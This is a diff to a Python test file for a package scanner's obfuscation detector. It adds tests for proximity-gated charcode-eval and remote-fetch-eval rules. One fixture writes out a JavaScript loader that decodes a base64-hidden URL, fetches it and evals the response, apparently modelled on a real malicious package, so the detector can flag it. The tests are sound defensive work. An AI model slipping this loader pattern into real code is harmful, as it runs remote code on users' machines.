@@ -6,7 +6,7 @@ hiragana identifiers hid an install-time remote-code fetcher that the base64 /
 entropy heuristics missed."""
 from __future__ import annotations
 
-from pkgsentry.analyze.obfuscation import analyze_obfuscation
+from pkgward.analyze.obfuscation import analyze_obfuscation
 
 # Two distinct 90-char alphabets (same printable set, different orderings) — each
 # a near-distinct run of printable ASCII, i.e. a base85/basE91-style charset.
@@ -183,9 +183,52 @@ def test_charcode_without_eval_clean(tmp_path):
 
 
 def test_packer_scanned_above_alphabet_cap(tmp_path, monkeypatch):
-    import pkgsentry.analyze.obfuscation as ob
+    import pkgward.analyze.obfuscation as ob
     monkeypatch.setattr(ob, "MAX_FILE_SIZE", 1024)  # tiny alphabet/CJK cap
     body = "// pad\n" + "x" * 4000 + "\neval(String.fromCharCode(65,66,67));\n"
     (tmp_path / "big.js").write_text(body)
     # alphabet pass is skipped (over cap) but the cheap packer scan still runs
     assert "obfuscation.charcode_eval" in _ids(ob.analyze_obfuscation(tmp_path))
+
+
+def test_charcode_eval_no_fire_when_eval_far_from_charcode(tmp_path):
+    """my-olly FP: a 6.6MB-style bundle with a UTF-16 codec (fromCharCode) and an eval
+    megabytes apart is NOT charcode->eval obfuscation — they must be near each other."""
+    # eval at the very top, a benign UTF-16 surrogate codec far below — unrelated.
+    text = ("eval(globalThis.__boot || '');\n"
+            + ("// filler bundle line\n" * 4000)
+            + "function dec(cp){return String.fromCharCode(cp>>>10&1023|55296, cp&1023|56320)}\n")
+    (tmp_path / "olly.js").write_text(text)
+    fs = analyze_obfuscation(tmp_path)
+    assert not [f for f in fs if f.rule_id == "obfuscation.charcode_eval"]
+
+
+def test_remote_fetch_eval_critical(tmp_path):
+    """The buffer-utilities miss: a base64-hidden C2 URL is fetched and the response
+    is eval'd — fetch(atob(url)).then(d=>eval(d.content)). The eval'd payload is REMOTE,
+    so the local decode->eval rules miss it. A fetch of an obfuscated URL near an eval
+    sink is a remote-code loader -> critical."""
+    (tmp_path / "index.js").write_text(
+        'const u = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9QVDBPTg==";\n'
+        "(function(){ fetch(atob(u)).then(t=>t.json()).then(d=>{ eval(d.content); }); })();\n"
+    )
+    fs = analyze_obfuscation(tmp_path)
+    hits = [f for f in fs if f.rule_id == "obfuscation.remote_fetch_eval"]
+    assert hits and hits[0].severity == "critical"
+
+
+def test_fetch_and_eval_far_apart_no_fire(tmp_path):
+    """A fetch and an unrelated eval megabytes apart must NOT fire (proximity-gated,
+    same discipline as charcode_eval)."""
+    text = ("fetch('https://api.example.com/data').then(r=>r.json());\n"
+            + ("// filler\n" * 4000)
+            + "eval(globalThis.__boot || '');\n")
+    (tmp_path / "app.js").write_text(text)
+    fs = analyze_obfuscation(tmp_path)
+    assert not [f for f in fs if f.rule_id == "obfuscation.remote_fetch_eval"]
+
+
+def test_eval_without_fetch_no_fire(tmp_path):
+    (tmp_path / "x.js").write_text("eval(userConfig.expr);\n")
+    fs = analyze_obfuscation(tmp_path)
+    assert not [f for f in fs if f.rule_id == "obfuscation.remote_fetch_eval"]
